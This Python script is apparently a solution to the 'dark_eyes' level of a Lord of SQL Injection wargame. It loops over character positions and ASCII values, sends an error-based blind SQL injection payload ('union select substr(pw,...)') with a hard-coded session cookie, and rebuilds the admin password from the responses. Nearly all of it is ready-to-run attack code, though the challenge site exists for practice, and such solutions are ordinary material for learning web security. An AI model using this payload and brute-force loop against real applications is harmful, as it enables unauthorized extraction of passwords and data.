import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")

pw = ''
for i in range(1,9):
    for j in range(48, 128):
        payload = f"' or id='admin' and (select 1 union select substr(pw,{i},1)='{chr(j)}') -- "
        response = requests.get(url, cookies=cookie, params={"pw":payload})
        if "query" in response.text:
            print(j)
            pw += chr(j)
            break

print(pw)